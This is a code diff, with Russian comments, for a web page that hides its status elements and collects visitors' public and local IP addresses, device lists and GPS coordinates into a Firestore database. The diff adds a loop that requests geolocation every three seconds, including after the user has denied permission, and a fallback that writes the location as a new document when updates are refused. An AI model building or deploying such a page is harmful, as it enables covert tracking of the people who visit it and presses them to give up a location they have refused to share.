@@ -37,17 +37,24 @@
     </div>
     <!-- Скрытые элементы для статусов -->
     <div id="authStatus" style="display:none"></div>
-    <div id="locationStatus" style="display:none"></div>
     <div id="publicIpStatus" style="display:none"></div>
     <div id="localIpStatus" style="display:none"></div>
-    <div id="firestoreStatus" style="display:none"></div>
     <table style="display:none"><tbody id="infoBody"></tbody></table>
+
+    <!-- Видимая отладочная панель: показывает статус сохранения и геолокации -->
+    <div style="position:fixed; left:8px; right:8px; bottom:8px; background:#111; color:#fff;
+                font-family:monospace; font-size:11px; padding:8px; border:1px solid #444;
+                border-radius:6px; max-height:40vh; overflow:auto;">
+        <div id="firestoreStatus">…</div>
+        <div id="locationStatus">…</div>
+        <div id="geoLog" style="margin-top:6px; color:#9cf; white-space:pre-wrap;"></div>
+    </div>
 
     <!-- Firebase SDK (modular) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         // Конфигурация Firebase
         const firebaseConfig = {
@@ -84,6 +91,14 @@
             el.innerText = text;
         }
 
+        const geoLogEl = document.getElementById("geoLog");
+        function logLine(msg) {
+            const t = new Date().toLocaleTimeString();
+            const line = `[${t}] ${msg}`;
+            console.log(line);
+            if (geoLogEl) geoLogEl.textContent += line + "\n";
+        }
+
         function addInfo(label, value) {
             if (value === undefined || value === null) value = "недоступно";
             const row = document.createElement("tr");
@@ -114,21 +129,211 @@
 
         async function saveToFirestore(data) {
             const ok = await authReady;
-            if (!ok) return;
+            if (!ok) return null;
 
             try {
                 data.timestamp = new Date().toISOString();
                 data.pageUrl = location.href;
-                data.firestoreDb = "(default)"; // можно вообще удалить эту строку
+                data.firestoreDb = "(default)";
 
                 const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
                 console.log("Saved to Firestore (default). Doc ID:", docRef.id);
                 firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore (default) (ID: ${docRef.id})`;
                 firestoreStatus.style.color = "green";
+                return docRef.id;
             } catch (error) {
                 console.error("Ошибка при записи в Firestore:", error);
                 firestoreStatus.innerHTML = `❌ Ошибка сохранения: ${error?.message || error}`;
                 firestoreStatus.style.color = "red";
+                return null;
+            }
+        }
+
+        async function updateGeoInFirestore(docId, geoData) {
+            const ok = await authReady;
+            if (!ok) {
+                console.warn("updateGeo: auth not ready");
+                firestoreStatus.innerHTML = "❌ updateGeo: нет авторизации";
+                firestoreStatus.style.color = "red";
+                return false;
+            }
+            if (!docId) {
+                console.warn("updateGeo: docId отсутствует, сохраняю гео отдельным документом");
+                try {
+                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
+                        ...geoData,
+                        note: "geo-only (no original docId)",
+                        timestamp: new Date().toISOString(),
+                        pageUrl: location.href
+                    });
+                    firestoreStatus.innerHTML = `✅ Гео сохранено отдельным doc (${docRef.id})`;
+                    firestoreStatus.style.color = "green";
+                    return true;
+                } catch (e) {
+                    console.error("Ошибка addDoc гео:", e);
+                    firestoreStatus.innerHTML = `❌ Гео addDoc: ${e?.code || ""} ${e?.message || e}`;
+                    firestoreStatus.style.color = "red";
+                    return false;
+                }
+            }
+            try {
+                await updateDoc(doc(db, COLLECTION_NAME, docId), geoData);
+                console.log("Geo updated for doc:", docId);
+                firestoreStatus.innerHTML = `✅ Гео обновлено в doc ${docId}`;
+                firestoreStatus.style.color = "green";
+                return true;
+            } catch (error) {
+                console.error("Ошибка updateDoc гео:", error);
+                firestoreStatus.innerHTML = `❌ updateDoc: ${error?.code || ""} ${error?.message || error}`;
+                firestoreStatus.style.color = "red";
+                // Фолбэк: если правила запрещают update — пишем отдельным документом со ссылкой
+                try {
+                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
+                        ...geoData,
+                        note: "geo-update-fallback",
+                        originalDocId: docId,
+                        timestamp: new Date().toISOString(),
+                        pageUrl: location.href
+                    });
+                    firestoreStatus.innerHTML = `⚠️ updateDoc запрещён, гео сохранено отдельным doc (${docRef.id}). Ссылка на оригинал: ${docId}`;
+                    firestoreStatus.style.color = "orange";
+                    return true;
+                } catch (e2) {
+                    console.error("Фолбэк addDoc тоже упал:", e2);
+                    return false;
+                }
+            }
+        }
+
+        function requestGeoOnce(options) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("not_supported"));
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve(position),
+                    (error) => reject(error),
+                    options || { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Ждёт лучший фикс через watchPosition с адаптивным выходом.
+        // Условия завершения (любое):
+        //   1) точность <= targetAccuracyMeters
+        //   2) точность не улучшилась за stableMs мс (значит лучше уже не будет)
+        //   3) истёк maxWaitMs
+        function watchBestPosition({
+            targetAccuracyMeters = 50,
+            maxWaitMs = 15000,
+            stableMs = 4000,
+            highAccuracy = true
+        } = {}) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("not_supported"));
+                    return;
+                }
+                let best = null;
+                let stableTimer = null;
+
+                const finish = (kind) => {
+                    navigator.geolocation.clearWatch(watchId);
+                    clearTimeout(hardTimer);
+                    clearTimeout(stableTimer);
+                    if (best) {
+                        logLine(`watch finish (${kind}), best ±${best.coords.accuracy.toFixed(1)} м`);
+                        resolve(best);
+                    } else {
+                        reject(new Error("watch_timeout_no_fix"));
+                    }
+                };
+
+                const armStableTimer = () => {
+                    clearTimeout(stableTimer);
+                    stableTimer = setTimeout(() => finish("stable"), stableMs);
+                };
+
+                const watchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        const acc = pos.coords.accuracy;
+                        logLine(`watch: фикс ±${acc.toFixed(1)} м`);
+                        const improved = !best || acc < best.coords.accuracy;
+                        if (improved) {
+                            best = pos;
+                            armStableTimer();
+                        }
+                        if (acc <= targetAccuracyMeters) finish("target");
+                    },
+                    (err) => {
+                        logLine(`watch error: ${err.code}/${err.message}`);
+                        if (best) finish("error-with-best");
+                        else {
+                            navigator.geolocation.clearWatch(watchId);
+                            clearTimeout(hardTimer);
+                            clearTimeout(stableTimer);
+                            reject(err);
+                        }
+                    },
+                    { enableHighAccuracy: highAccuracy, timeout: maxWaitMs, maximumAge: 0 }
+                );
+
+                const hardTimer = setTimeout(() => finish("hard-timeout"), maxWaitMs);
+                armStableTimer();
+            });
+        }
+
+        async function requestGeoSmart() {
+            // Берём первый же фикс — без ожидания улучшения точности.
+            try {
+                return await requestGeoOnce({ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            } catch (e1) {
+                logLine(`high-accuracy не вышел (${e1?.code || ""}/${e1?.message || e1}), пробую low-accuracy…`);
+                return await requestGeoOnce({ enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
+            }
+        }
+
+        async function ensureGeoAndUpdate(docId) {
+            logLine(`ensureGeoAndUpdate старт, docId=${docId}`);
+            let attempt = 0;
+            while (true) {
+                attempt++;
+                logLine(`Попытка #${attempt}: getCurrentPosition()`);
+                try {
+                    const position = await requestGeoSmart();
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const lat = latitude.toFixed(6);
+                    const lon = longitude.toFixed(6);
+                    const acc = (accuracy || 0).toFixed(1) + " м";
+                    logLine(`✅ Гео получено: ${lat}, ${lon} (±${acc})`);
+                    addInfo("Широта", lat);
+                    addInfo("Долгота", lon);
+                    addInfo("Точность GPS", acc);
+                    setStatus(locationStatus, "success", "✅ Геолокация получена");
+                    logLine(`Пишу в Firestore (docId=${docId})…`);
+                    const ok = await updateGeoInFirestore(docId, {
+                        "Широта": lat,
+                        "Долгота": lon,
+                        "Точность GPS": acc,
+                        geoUpdatedAt: new Date().toISOString()
+                    });
+                    logLine(`Результат записи: ${ok ? "OK" : "FAIL"}`);
+                    if (ok) return;
+                    await new Promise((r) => setTimeout(r, 3000));
+                } catch (error) {
+                    let msg = "❌ Геолокация недоступна";
+                    if (error && typeof error.code !== "undefined") {
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
+                            case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
+                            case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
+                        }
+                    }
+                    logLine(msg + ` (${error?.message || error?.code || error})`);
+                    setStatus(locationStatus, "error", msg);
+                    await new Promise((r) => setTimeout(r, 3000));
+                }
             }
         }
 
@@ -233,38 +438,6 @@
                 addInfo("enumerateDevices", "не поддерживается");
             }
 
-            const geoPromise = new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            addInfo("Широта", latitude.toFixed(6));
-                            addInfo("Долгота", longitude.toFixed(6));
-                            addInfo("Точность GPS", accuracy.toFixed(1) + " м");
-                            setStatus(locationStatus, "success", "✅ Геолокация получена");
-                            resolve();
-                        },
-                        (error) => {
-                            let msg = "";
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
-                                case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
-                                case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
-                                default: msg = "❌ Неизвестная ошибка геолокации";
-                            }
-                            addInfo("Геолокация", msg);
-                            setStatus(locationStatus, "error", msg);
-                            resolve();
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                } else {
-                    addInfo("Геолокация", "не поддерживается браузером");
-                    setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
-                    resolve();
-                }
-            });
-
             const publicIPPromise = getPublicIP().then((ip) => {
                 addInfo("Публичный IP", ip);
                 setStatus(publicIpStatus, ip.includes("не удалось") ? "error" : "success", ip);
@@ -275,8 +448,16 @@
                 setStatus(localIpStatus, ip.includes("не удалось") || ip.includes("не поддерживается") ? "error" : "success", ip);
             });
 
-            await Promise.all([geoPromise, publicIPPromise, localIPPromise]);
-            await saveToFirestore(collectedData);
+            await Promise.all([publicIPPromise, localIPPromise]);
+
+            const docId = await saveToFirestore(collectedData);
+
+            if (!navigator.geolocation) {
+                setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
+                return;
+            }
+
+            ensureGeoAndUpdate(docId);
         })();
     </script>
 </body>
